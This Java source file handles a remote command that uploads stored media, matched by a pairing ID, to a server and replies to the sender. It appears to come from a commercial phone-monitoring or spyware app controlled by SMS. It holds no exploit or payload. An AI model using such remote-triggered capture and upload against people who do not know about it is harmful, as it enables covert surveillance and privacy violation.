package com.vvt.remotecommandmanager.processor.media;

import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.exceptions.FxNotImplementedException;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDbCorruptException;
import com.vvt.exceptions.database.FxDbIdNotFoundException;
import com.vvt.exceptions.database.FxDbNotOpenException;
import com.vvt.exceptions.database.FxDbOperationException;
import com.vvt.exceptions.io.FxFileNotFoundException;
import com.vvt.exceptions.io.FxFileSizeNotAllowedException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class UploadActualMediaProcessor  extends RemoteCommandProcessor {
	private static final String TAG = "UploadActualMediaProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int INDEX_OF_PAIRING_ID = 0;
	
	private EventDelivery mEventDelivery;
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private CountDownLatch waitForResponseLatch;
	private FxEventRepository mFxEventRepository;
	private int mParingId = -1;
	private StringBuilder mReplyMessageBuilder;
	private LicenseInfo mLicenseInfo;
	
	public UploadActualMediaProcessor(AppContext appContext, EventDelivery eventDelivery,
			FxEventRepository eventRepository,
			LicenseInfo licenseInfo) {
		
		super(appContext, eventRepository);
	
		mEventDelivery = eventDelivery;
		mFxEventRepository = eventRepository;
		mReplyMessage = new ProcessingResult();
		mLicenseInfo = licenseInfo;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		
		waitForResponseLatch = new CountDownLatch(1);
		
		mReplyMessageBuilder = new StringBuilder();
		
		if(commandData.getArguments().size() != 1) {
			if(LOGE) FxLog.e(TAG, "commandData arguments count invalid");
			throw new InvalidCommandFormatException();
		}

		try{
			mParingId = Integer.parseInt(commandData.getArguments().get(INDEX_OF_PAIRING_ID));
		}
		catch(NumberFormatException nfe) {
			if(LOGE) FxLog.e(TAG, "Erorr occured getting the pairing id value");
			throw new InvalidCommandFormatException();
		}
		
		if(mParingId < 0) {
			if(LOGE) FxLog.e(TAG, "Invalid pairing id value");
			throw new InvalidCommandFormatException();
		}
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {
			
			// Call the get method and make sure media is still there..
			mFxEventRepository.validateMedia(mParingId);
			
			mEventDelivery.deliverActualMedia(mParingId, mDeliveryListener);
			
			//Block the thread and wait till onSuccess or onError called.
			try {
				waitForResponseLatch.await();
			} catch (InterruptedException e) {
				mReplyMessage.setIsSuccess(false);
				mReplyMessageBuilder.append(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_CANNOT_UPLOAD_ERROR, e.getMessage(), mParingId));
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			}
			
		} catch (FxDbIdNotFoundException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_PAIRING_ID_NOT_FOUND, mParingId));
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			insertSystemLogEntry(mParingId, FxSystemEventCategories.CATEGORY_MEDIA_ID_NOT_FOUND, e.getMessage());
		} catch (FxNotImplementedException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_CANNOT_UPLOAD_ERROR, e.getMessage(), mParingId));
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		} catch (FxDbOperationException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_CANNOT_UPLOAD_ERROR, e.getMessage(), mParingId));
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		} catch (FxFileNotFoundException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_FILE_NOT_FOUND, mParingId));
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			insertSystemLogEntry(mParingId, FxSystemEventCategories.CATEGORY_MEDIA_ID_NOT_FOUND, e.getMessage());
		} catch (FxFileSizeNotAllowedException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_FILE_SIZE_NOT_ALLOWED, mParingId));
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			insertSystemLogEntry(mParingId, FxSystemEventCategories.CATEGORY_MEDIA_EVENT_MAX_REACHED, e.getMessage());
		}
		 
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	
	/**
	 * Insert an entry to system log.
	 * @param paringId
	 * @param category
	 * @throws FxNotImplementedException
	 * @throws FxDbCorruptException 
	 * @throws FxDbOperationException 
	 * @throws FxNullNotAllowedException 
	 * @throws FxDbNotOpenException 
	 */
	private void insertSystemLogEntry(long paringId, 
			FxSystemEventCategories category,
			String message)  {
		
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setDirection(FxEventDirection.UNKNOWN);
		systemEvent.setLogType(category);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setMessage(message);

		try {
			mFxEventRepository.insert(systemEvent);
		} catch (FxDbNotOpenException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		} catch (FxNullNotAllowedException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		} catch (FxNotImplementedException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		} catch (FxDbOperationException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}
	}
	
	DeliveryListener mDeliveryListener = new DeliveryListener() {
		@Override
		public void onFinish(DeliveryResponse paramDeliveryResponse) {
			if(paramDeliveryResponse.isSuccess()) {
				mReplyMessage.setIsSuccess(true);
				mReplyMessage.setMessage(String.format(MessageManager.UPLOAD_ACTUAL_MEDIA_COMPLETE, mParingId));
				waitForResponseLatch.countDown();	
			}
			else {
				mReplyMessage.setIsSuccess(false);
				mReplyMessage.setMessage(RemoteCommandUtil.getErrorMessage(paramDeliveryResponse));
				waitForResponseLatch.countDown();
			}
		}

		@Override
		public void onProgress(DeliveryResponse paramDeliveryResponse) { }
	};
	
	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
